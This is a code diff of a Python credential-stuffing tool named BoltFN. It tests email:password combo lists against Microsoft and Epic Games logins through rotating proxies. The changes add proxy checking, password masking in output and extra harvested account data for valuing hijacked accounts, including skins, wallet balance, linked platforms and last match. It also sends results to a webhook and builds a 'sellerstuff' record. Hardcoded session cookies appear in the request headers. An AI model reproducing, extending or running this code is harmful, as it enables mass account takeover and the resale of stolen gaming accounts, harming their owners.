+            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
+            "canary": "",
+            "ctx": "",
+            "hpgrequestid": "",
+            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
+            "PPSX": "Passp",
+            "NewUser": "1",
+            "FoundMSAs": "",
+            "fspost": "0",
+            "i21": "0",
+            "CookieDisclosure": "0",
+            "IsFidoSupported": "1",
+            "isSignupPost": "0",
+            "isRecoveryAttemptPost": "0",
+            "i19": "21648"
+        }
+        while True:
+            try:
+                response = requests.post(url, headers=headers, data=payload, proxies=proxy_form, timeout=Checker.timeout)
+                Counter.hits+=1
+                self.prints(f'{Fore.GREEN}[Hit] - {proxy}')
+                open(f'{self.folder}/Hits.txt', 'a',encoding='u8').write(f'{proxy}\n')
+                return
+            except Exception as e:
+                Counter.bad+=1
+                self.prints(f'{Fore.RED}[Bad] - {proxy}')
+                open(f'{self.folder}/Bad.txt', 'a',encoding='u8').write(f'{proxy}\n')
+                return
+        
     def usecheck(self, line):
         try:
             if line.count(':') == 1:
@@ -698,7 +800,7 @@ class Main:
                                     "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
                                     "Cache-Control": "max-age=0",
                                     "Connection": "keep-alive",
-                                    "Content-Length": "814",  # Make sure the content length is correct; it's generally calculated automatically.
+                                    "Content-Length": "814",
                                     "Content-Type": "application/x-www-form-urlencoded",
                                     "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
                                     "Host": "login.live.com",
@@ -840,7 +942,7 @@ class Main:
                                                         Counter.hits+=1
                                                         if 'n' == self.cuimode:
                                                             if Checker.printms:
-                                                                self.prints(f'{Fore.YELLOW}[HIT] - {line}')
+                                                                self.prints(f'{Fore.YELLOW}[HIT] - {self.blur(line)}')
                                                         if not os.path.exists(self.folder + '/Fortnite'):
                                                             os.makedirs(self.folder + '/Fortnite')
                                                         open(f'{self.folder}/Fortnite/Hits.txt', 'a',
@@ -855,7 +957,7 @@ class Main:
                                                         Counter.mshit+=1
                                                         if 'n' == self.cuimode:
                                                             if Checker.printms:
-                                                                self.prints(f'{Fore.YELLOW}[MS-HIT] - {line}')
+                                                                self.prints(f'{Fore.YELLOW}[MS-HIT] - {self.blur(line)}')
                                                         if not os.path.exists(self.folder + '/Microsoft'):
                                                             os.makedirs(self.folder + '/Microsoft')
                                                         open(f'{self.folder}/Microsoft/Hits.txt', 'a',
@@ -936,7 +1038,7 @@ class Main:
                                                     Counter.mshit+=1
                                                     Counter.epic2fa+=1
                                                     if 'n' == self.cuimode:
-                                                        self.prints(f'{Fore.GREEN}[HIT][2FA] - {line}')
+                                                        self.prints(f'{Fore.GREEN}[HIT][2FA] - {self.blur(line)}')
                                                     if not os.path.exists(self.folder + '/Microsoft'):
                                                         os.makedirs(self.folder + '/Microsoft')
                                                     open(f'{self.folder}/Microsoft/2fa.txt', 'a',
@@ -950,7 +1052,7 @@ class Main:
                                                     if line in Counter.remaining:
                                                             Counter.remaining.remove(line)
                                                     if 'n' == self.cuimode:
-                                                        self.prints(f'{Fore.GREEN}[HIT][HEADLESS] - {line}')
+                                                        self.prints(f'{Fore.GREEN}[HIT][HEADLESS] - {self.blur(line)}')
                                                     if not os.path.exists(self.folder + '/NoCapture'):
                                                         os.makedirs(self.folder + '/NoCapture')
                                                     open(f'{self.folder}/NoCapture/headless.txt', 'a',
@@ -964,7 +1066,7 @@ class Main:
                                                             Counter.remaining.remove(line)
                                                     if 'n' == self.cuimode:
                                                         if Checker.printms:
-                                                            self.prints(f'{Fore.YELLOW}[MS-HIT][XBOX] - {line}')
+                                                            self.prints(f'{Fore.YELLOW}[MS-HIT][XBOX] - {self.blur(line)}')
                                                     if not os.path.exists(self.folder + '/Microsoft'):
                                                         os.makedirs(self.folder + '/Microsoft')
                                                     open(f'{self.folder}/Microsoft/Xbox.txt', 'a',
@@ -1043,7 +1145,7 @@ class Main:
                                                         if line in Counter.remaining:
                                                             Counter.remaining.remove(line)
                                                         if 'n' == self.cuimode:
-                                                            self.prints(f'{Fore.GREEN}[HIT][NC] - {line}')
+                                                            self.prints(f'{Fore.GREEN}[HIT][NC] - {self.blur(line)}')
                                                         if not os.path.exists(self.folder + '/NoCapture'):
                                                             os.makedirs(self.folder + '/NoCapture')
                                                         open(f'{self.folder}/NoCapture/logins.txt', 'a',
@@ -1056,7 +1158,7 @@ class Main:
                                                             Counter.remaining.remove(line)
                                                         if Checker.printms:
                                                             if 'n' == self.cuimode:
-                                                                self.prints(f'{Fore.GREEN}[MS-HIT][XBOX BAN] - {line}')
+                                                                self.prints(f'{Fore.GREEN}[MS-HIT][XBOX BAN] - {self.blur(line)}')
                                                         if not os.path.exists(self.folder + '/Microsoft'):
                                                             os.makedirs(self.folder + '/Microsoft')
                                                         open(f'{self.folder}/Microsoft/XboxBan.txt', 'a',
@@ -1079,8 +1181,11 @@ class Main:
                                             except Exception as e:
                                                 Counter.retries+=1
                                                 continue
-                                        if not os.path.exists(self.folder + '/NoCapture'):
-                                            os.makedirs(self.folder + '/NoCapture')
+                                        try:
+                                            if not os.path.exists(self.folder + '/NoCapture'):
+                                                os.makedirs(self.folder + '/NoCapture')
+                                        except:
+                                            pass
                                         open(f'{self.folder}/NoCapture/all.txt', 'a',
                                         encoding='u8').write(f'{line}\n')
                                         url = "https://www.epicgames.com/id/api/redirect?redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&provider=xbl&clientId=875a3b57d3a640a6b7f9b4e883463ab4"
@@ -1149,7 +1254,7 @@ class Main:
                                                     response = scraper.get(url, headers=headers, cookies=response2.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                     if 'Sorry, your account has too many active logins' in response.text:
                                                         if 'n' == self.cuimode:
-                                                            self.prints(f'{Fore.GREEN}[HIT][NC] - {line}')
+                                                            self.prints(f'{Fore.GREEN}[HIT][NC] - {self.blur(line)}')
                                                         Counter.hits+=1
                                                         if line in Counter.remaining:
                                                             Counter.remaining.remove(line)
@@ -1164,7 +1269,7 @@ class Main:
                                                                 Counter.remaining.remove(line)
                                                             if Checker.printms:
                                                                 if 'n' == self.cuimode:
-                                                                    self.prints(f'{Fore.GREEN}[MS-HIT][XBOX BAN] - {line}')
+                                                                    self.prints(f'{Fore.GREEN}[MS-HIT][XBOX BAN] - {self.blur(line)}')
                                                             if not os.path.exists(self.folder + '/Microsoft'):
                                                                 os.makedirs(self.folder + '/Microsoft')
                                                             open(f'{self.folder}/Microsoft/XboxBan.txt', 'a',
@@ -1424,11 +1529,45 @@ class Main:
                                             "User-Agent": "UELauncher/11.0.2-14967703+++Portal+Release-Live Windows/10.0.19041.1.256.64bit",
                                             "Authorization": f"bearer {AT1}"
                                         }
+                                        linked = []
                                         try:
+                                            url = f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{ACCID}/externalAuths'
+                                            while True:
+                                                try:
+                                                    response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
+                                                    if response.status_code == 200:
+                                                        break
+                                                    else:
+                                                        Counter.retries+=1
+                                                        continue 
+                                                except Exception as e:
+                                                    Counter.retries+=1
+                                                    continue 
+                                            platforms = {
+                                                '"type":"xbl"': 'Xbox',
+                                                '"type":"psn"': 'Playstation',
+                                                '"type":"steam"': 'Steam',
+                                                '"type":"twitch"': 'Twitch',
+                                                '"type":"lego"': 'Lego',
+                                                '"type":"nintendo"': 'Nintendo',
+                                                '"type":"github"': 'Github'
+                                            }
+                                            for platform_type, platform_name in platforms.items():
+                                                if platform_type in response.text:
+                                                    linked.append(platform_name)
+                                            url = f'https://egs-platform-service.store.epicgames.com/api/v1/private/egs/account/wallet?locale=en&store=EGS'
+                                            while True:
+                                                try:
+                                                    response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
+                                                    break
+                                                except:
+                                                    Counter.retries+=1
+                                                    continue
+                                            balance = response.json().get("epicRewards", {}).get("balance", None)
                                             url = f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{ACCID}"
                                             while True:
                                                 try:
-                                                    response = requests.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
+                                                    response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                     if response.status_code == 200:
                                                         data = response.json()  
                                                         break
@@ -1437,11 +1576,12 @@ class Main:
                                                         continue 
                                                 except Exception as e:
                                                     Counter.retries+=1
-                                                    continue  
+                                                    continue 
                                             display_name = data.get("displayName", "Not Available")
                                             country = data.get("country", "Not Available")
                                             tfa_enabled = data.get("tfaEnabled", "Not Available")
                                             epicEmail = data.get("email", "Not Available")
+                                            email_verified_status = data.get("emailVerified", "Unknown")
                                             url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/public/QueryPublicProfile?profileId=campaign"
                                             headers = {
                                                 "Authorization": f"Bearer {AT}",
@@ -1481,7 +1621,7 @@ class Main:
                                                             Counter.remaining.remove(line)
                                                 Counter.fnban+=1
                                                 if 'n' == self.cuimode:
-                                                    self.prints(f'{Fore.YELLOW}[FN-BAN] - {line}')
+                                                    self.prints(f'{Fore.YELLOW}[FN-BAN] - {self.blur(line)}')
                                                 if not os.path.exists(self.folder + '/Fortnite'):
                                                     os.makedirs(self.folder + '/Fortnite')
                                                 open(f'{self.folder}/Fortnite/Banned.txt', 'a',
@@ -1494,7 +1634,7 @@ class Main:
                                                 if line in Counter.remaining:
                                                     Counter.remaining.remove(line)
                                             except:
-                                                n = 'n'
+                                                pass
                                             level_pattern = re.compile(r'"accountLevel"\s*:\s*(\d+)')
                                             total_wins_pattern = re.compile(r'"lifetime_wins"\s*:\s*(\d+)')
                                             level_match = level_pattern.search(response_str)
@@ -1503,6 +1643,10 @@ class Main:
                                             total_wins = total_wins_match.group(1) if total_wins_match else 'N/A'
                                             data = response.json()
                                             past_seasons = data.get('profileChanges', [])[0].get('profile', {}).get('stats', {}).get('attributes', {}).get('past_seasons', [])
+                                            try:
+                                                last_login = data.get('profileChanges', [])[0].get('profile', {}).get('stats', {}).get('attributes', {}).get('last_match_end_datetime', 'N/A')
+                                            except:
+                                                last_login = 'N/A'
                                             first_active_season = None
                                             for season in past_seasons:
                                                 try:
@@ -1510,7 +1654,6 @@ class Main:
                                                         if first_active_season is None or season['seasonNumber'] < first_active_season['seasonNumber']:
                                                             first_active_season = season
                                                 except:
-                                                    n = 'n'
                                                     continue
                                             if first_active_season:
                                                 first_active_season = first_active_season['seasonNumber']
@@ -1539,7 +1682,7 @@ class Main:
                                                                 while True:
                                                                     try:
                                                                         url = f'https://fortnite-api.com/v2/cosmetics/br/{skin_id}'
-                                                                        r = requests.get(url, proxies=self.proxies(), timeout=Checker.timeout).json()
+                                                                        r = requests.get(url, timeout=Checker.timeout).json()
                                                                         if r['status'] == 200:
                                                                             skinName = r['data']['name']
                                                                             with open('skins_database.txt', 'a') as file:
@@ -1551,7 +1694,9 @@ class Main:
                                                                     except Exception as e:
                                                                         Counter.retries +=1
                                                                         continue
-                                                            skins.append(skinName)
+                                                            wtf = ['Cursed Jack Sparrow', 'Robert Trujillo', 'Kirk Hammett', 'James Hetfield', 'The Weeknd']
+                                                            if skinName not in wtf:
+                                                                skins.append(skinName)
                                                         else:
                                                             search_skins(value)
                                                 elif isinstance(obj, list):
@@ -1562,11 +1707,15 @@ class Main:
                                             total_skins = len(unique_skins)
                                             processed_skins = [skin.replace("character_speeddial", "").strip() for skin in unique_skins]
                                             exclusiveSkins = [
-                                                'black knight','chun-li', 'huntmaster saber', 'the reaper', 'blue squire', 
+                                                'glow', 'eon', 'dark skully', 'rogue spider knight'
+                                                'black knight', 'skull trooper', 'ghoul trooper',
+                                                'omega','blitz', 'havoc', 'john wick', 'blue striker',
+                                                'prodigy', 'galaxy', 'blue team leader', 'royal knight',
+                                                'stealth reflex', 'sub commander','chun-li', 'huntmaster saber','the reaper', 'blue squire', 
                                                 'royale knight', 'sparkle specialist', 'brutus', 
                                                 'midas', 'world cup', 'rogue agent', 'elite agent', 'trailblazer', 
                                                 'strong guard', 'rose team leader', 'warpaint', 'travis', 
-                                                'eddie brock', 'master chief', 'fresh', 'aerial assault trooper', 'ikonik'
+                                                'eddie brock', 'master chief', 'fresh', 'aerial assault trooper', 'ikonik', 'reflex'
                                             ]
                                             for skin in processed_skins:
                                                 if skin.lower() in exclusiveSkins:
@@ -1638,7 +1787,7 @@ class Main:
                                                 (f'[V:{Total_VBucks}]' if Total_VBucks > 0 else '') +
                                                 (f'[P:{total_pickaxes}]' if int(total_pickaxes) > 0 else '') +
                                                 (f'[B:{total_backpacks}]' if int(total_backpacks) > 0 else '') +
-                                                f' - {line}'
+                                                f' - {self.blur(line)}'
                                                 )
                                             try:
                                                 if int(first_active_season) <= 4:
@@ -1654,10 +1803,12 @@ class Main:
                                                 os.makedirs(self.folder + '/Fortnite')
                                             open(f'{self.folder}/Fortnite/all.txt', 'a',
                                             encoding='u8').write(f'{line}\n')
-                                            message = f"{email}:{password} | Name: {display_name} | FullAccess: {fullAccess} | Email Verified: {email_verified_status}"
+                                            message = f"{email}:{password} | Name: {display_name} | FullAccess: {fullAccess} | Email Verified: {email_verified_status} | Linked Accounts: {linked}"
                                             if tfa_enabled != None: message+=f" | 2FA: {tfa_enabled}"
+                                            if last_login != None: message+=f" | Last Match: {last_login}"
                                             if fullAccess == 'NFA': message+=f" | Epic Email: {epicEmail}"
                                             if country != None: message+=f" | Country: {country}"
+                                            if balance != None: message+=f" | Balance: {balance}"
                                             if has_stw != 'NO': message+=f" | Save The World"
                                             if level != None: message+=f" | Level: {level}"
                                             if Total_VBucks != None: message+=f"  | Vbucks: {Total_VBucks}"
@@ -1674,7 +1825,7 @@ class Main:
                                                 exclusiveskins = 0
                                             else:
                                                 exclusiveskins = len(exclusiveSkin)
-                                            Counter.sellerstuff.append({"fullAccess": fullAccess,"2fa": tfa_enabled, "total_skins": total_skins,"skins_list": processed_skins,"exclusive": exclusive,"exclusives_list": exclusiveSkin,"mail_verified": email_verified_status})
+                                            Counter.sellerstuff.append({"fullAccess": fullAccess,"2fa": tfa_enabled, "total_skins": total_skins,"skins_list": processed_skins,"exclusive": exclusive,"exclusives_list": exclusiveSkin,"mail_verified": email_verified_status,"last_login": last_login,"linked_accs": linked,"balance":balance})
                                             if Checker.webhook.webhooky:
                                                 payload = {
                                                         "username": "BOLTFN",
@@ -1696,7 +1847,8 @@ class Main:
                                                                 {"name": "2FA", "value": tfa_enabled},
                                                                 {"name": "Save The World", "value": has_stw},
                                                                 {"name": "Exclusive Skins", "value": f'[{exclusiveskins}] {exclusiveSkin}'},
-                                                                {"name": "Skins", "value": f'[{total_skins}] {processed_skins}'},
+                                                                {"name": "Skin Count", "value": f'[{total_skins}]'},
+                                                                {"name": "Last Match", "value": last_login},
                                                                 {"name": "Account Type", "value": fullAccess}
                                                             ],
                                                             "footer": {"text": "MSFN", "icon_url": "https://cdn-icons-png.flaticon.com/512/25/25231.png"}
@@ -1760,6 +1912,8 @@ class Main:
                                                 encoding='u8').write(f'{line}\n')
                                             return
                                         except Exception as e:
+                                            with open('error_log.txt', 'a', encoding='utf8') as f:
+                                                f.write(e + '\n')
                                             Counter.retries+=1
                                             continue
 
@@ -1768,17 +1922,18 @@ class Main:
                                         Counter.retries+=1
                                         continue
                                 else:
+                                    print(url)
                                     checked_num +=1
                                     Counter.retries+=1
                                     continue
                     else:
                         if result == 'Failure':
                             if line in Counter.remaining:
-                                                            Counter.remaining.remove(line)
+                                Counter.remaining.remove(line)
                             Counter.bad+=1
                             if Checker.printbadd:
                                 if 'n' == self.cuimode:
-                                    self.prints(f'{Fore.RED}[BAD] - {line}')
+                                    self.prints(f'{Fore.RED}[BAD] - {self.blur(line)}')
                                 if Checker.save_bad:
                                     if not os.path.exists(self.folder + '/Bad'):
                                         os.makedirs(self.folder + '/Bad')
@@ -1787,11 +1942,11 @@ class Main:
                             return
                         elif result == '2FACTOR':
                             if line in Counter.remaining:
-                                                            Counter.remaining.remove(line)
+                                Counter.remaining.remove(line)
                             Counter.custom+=1
                             if Checker.printbadd:
                                 if 'n' == self.cuimode:
-                                        self.prints(f'{Fore.RED}[2FA] - {line}')
+                                        self.prints(f'{Fore.RED}[2FA] - {self.blur(line)}')
                             if Checker.save_bad:
                                 if not os.path.exists(self.folder + '/Bad'):
                                     os.makedirs(self.folder + '/Bad')
@@ -1800,11 +1955,11 @@ class Main:
                             return
                         elif result == 'Ban':
                             if line in Counter.remaining:
-                                                            Counter.remaining.remove(line)
+                                Counter.remaining.remove(line)
                             Counter.custom+=1
                             if Checker.printbadd:
                                 if 'n' == self.cuimode:
-                                        self.prints(f'{Fore.RED}[2FA] - {line}')
+                                        self.prints(f'{Fore.RED}[2FA] - {self.blur(line)}')
                             if Checker.save_bad:
                                 if not os.path.exists(self.folder + '/Bad'):
                                     os.makedirs(self.folder + '/Bad')
@@ -1813,11 +1968,11 @@ class Main:
                             return
                         elif result == 'CUSTOM':
                             if line in Counter.remaining:
-                                                            Counter.remaining.remove(line)
+                                Counter.remaining.remove(line)
                             Counter.locked+=1
                             if Checker.printbadd:
                                 if 'n' == self.cuimode:
-                                        self.prints(f'{Fore.RED}[LOCKED] - {line}')
+                                        self.prints(f'{Fore.RED}[LOCKED] - {self.blur(line)}')
                             if Checker.save_bad:
                                 if not os.path.exists(self.folder + '/Bad'):
                                     os.makedirs(self.folder + '/Bad')
@@ -1826,11 +1981,11 @@ class Main:
                             return
                         elif result == 'Unknown':
                                 if line in Counter.remaining:
-                                                            Counter.remaining.remove(line)
+                                    Counter.remaining.remove(line)
                                 Counter.bad+=1
                                 if Checker.printbadd:
                                     if 'n' == self.cuimode:
-                                        self.prints(f'{Fore.RED}[BAD] - {line}')
+                                        self.prints(f'{Fore.RED}[BAD] - {self.blur(line)}')
                                 if Checker.save_bad:
                                     if not os.path.exists(self.folder + '/Bad'):
                                         os.makedirs(self.folder + '/Bad')
@@ -1840,49 +1995,17 @@ class Main:
             else:
                 Counter.bad+=1
                 if line in Counter.remaining:
-                                                            Counter.remaining.remove(line)
+                    Counter.remaining.remove(line)
                 return
         except Exception as e:
             Counter.bad+=1
             if line in Counter.remaining:
-                                                            Counter.remaining.remove(line)
+                Counter.remaining.remove(line)
             return
-    def follow_redirects(self, scraper, url, headers, cookies, retries, proxies, timeout):
-        try:
-            response = scraper.get(url, headers=headers, allow_redirects=False, cookies=cookies, proxies=self.proxies(), timeout=Checker.timeout)
-            location = response.headers.get('location')
-
-            return response, location
-        except KeyError:
-            return None, None
-        except Exception as e:
-            Counter.retries += 1
-            return None, None
-
-    def process_redirect_chain(self, scraper, initial_url, headers, cookies):
-        url = initial_url
-        while True:
-            response, location = self.follow_redirects(scraper, url, headers, cookies)
-            if not location:
-                retries += 1
-                continue
-
-            if 'https://www.unrealengine.com:443/id/api/sso?sid=' in location:
-                url = location
-            elif 'https://www.twinmotion.com:443/id/api/sso?sid=' in location:
-                url = location
-            elif 'https://www.fortnite.com:443/id/api/sso?' in location:
-                url = location
-            else:
-                retries += 1
-                continue
-
-            response, _ = self.follow_redirects(scraper, url, headers, response.cookies)
-            if response and 'eg1~' in response.cookies.get('REFRESH_EPIC_EG1', ''):
-                return response
-            else:
-                retries += 1
-                continue
+    def blur(self, line):
+        email,password = line.split(':')
+        password = len(password) * '*'
+        return f'{email}:{password}'
     def parse_1(self,text):
         dis_match = re.search(r'"lastName":"(.*?)","email":"(.*?)"', text)
         if dis_match:
@@ -1914,7 +2037,7 @@ class Main:
             display_name = 'Error'
             country = 'Error'
             accid = 'Error'
-            email_verified_status = 'Error'
+            email_verified_status = 'Unknown'
         return display_name,country,accid,email_verified_status
     def parse_lr(self,text, start_delim, end_delim):
         pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
@@ -1975,7 +2098,11 @@ class Main:
 
     def title(self):
         while True:
-                Total = len(self.accounts)
+            try:
+                if Counter.proxy:
+                    Total = len(self.proxylist)
+                else:
+                    Total = len(self.accounts)
                 Checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban
                 badd = Counter.bad / Total * 100
                 chek = int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban
@@ -1984,26 +2111,14 @@ class Main:
                     estimated = Counter.hits + Counter.fnban/Checked * Total
                 Counter.checkedpercent = round((chek / Total) * 100, 2)
                 Counter.failedpercent = round(badd, 2)
-                Counter.hitspercent = round((Counter.hits + Counter.fnban / Total) * 100, 2)
+                shit = Counter.hits + Counter.fnban
+                Counter.hitspercent = round((shit / Total * 100), 2)
                 Counter.headlesspercent = round((int(Counter.headless) / Total) * 100, 2)
                 cust = Counter.custom + Counter.locked
                 Counter.custompercent =round(number=(cust / Total * 100), ndigits=2)
                 Counter.mshitspercent = round((int(Counter.mshit) / Total) * 100, 2)
                 estimatedhits = round(estimated)
-                Total = len(self.accounts)
-                if not Counter.brute:
-                    windll.kernel32.SetConsoleTitleW(
-                        f"BoltFN | v{self.version}"
-                        f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban}/{Total} ({Counter.checkedpercent}%)"
-                        f" | Hits: {Counter.hits + Counter.fnban} ({Counter.hitspercent}%) [{estimatedhits}]"
-                        f" | Headless: {Counter.headless} ({Counter.headlesspercent}%)"
-                        f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
-                        f" | 2FA: {Counter.custom + Counter.locked} ({Counter.custompercent}%)"
-                        f" | Failed: {Counter.bad} ({Counter.failedpercent}%)"
-                        f' | Retries: {Counter.retries}'
-                        f' | CPM: {Counter.cpm}'
-                        f' | Checking for: {self.Timeused()}')
-                else:
+                if Counter.brute:
                     inval = Counter.bad + Counter.custom + Counter.locked
                     badd = inval / Total * 100
                     Counter.failedpercent = round(badd, 2)
@@ -2016,6 +2131,30 @@ class Main:
                         f' | Retries: {Counter.retries}'
                         f' | CPM: {Counter.cpm}'
                         f' | Checking for: {self.Timeused()}')
+                elif Counter.proxy:
+                    chek = Counter.hits
+                    Counter.checkedpercent = round((chek / Total) * 100, 2)
+                    windll.kernel32.SetConsoleTitleW(
+                        f"BoltFN | v{self.version}"
+                        f" | Checked: {Counter.bad + Counter.hits}/{Total} ({Counter.checkedpercent}%)"
+                        f" | Hits: {Counter.hits} ({Counter.hitspercent}%) [{estimatedhits}]"
+                        f" | Failed: {Counter.bad} ({Counter.failedpercent}%)"
+                        f' | CPM: {Counter.cpm}'
+                        f' | Checking for: {self.Timeused()}')
+                else:
+                    windll.kernel32.SetConsoleTitleW(
+                        f"BoltFN | v{self.version}"
+                        f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban}/{Total} ({Counter.checkedpercent}%)"
+                        f" | Hits: {Counter.hits + Counter.fnban} ({Counter.hitspercent}%) [{estimatedhits}]"
+                        f" | Headless: {Counter.headless} ({Counter.headlesspercent}%)"
+                        f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
+                        f" | 2FA: {Counter.custom + Counter.locked} ({Counter.custompercent}%)"
+                        f" | Failed: {Counter.bad} ({Counter.failedpercent}%)"
+                        f' | Retries: {Counter.retries}'
+                        f' | CPM: {Counter.cpm}'
+                        f' | Checking for: {self.Timeused()}')
+            except Exception as e:
+                print(e)
 
 
     def proxies(self):
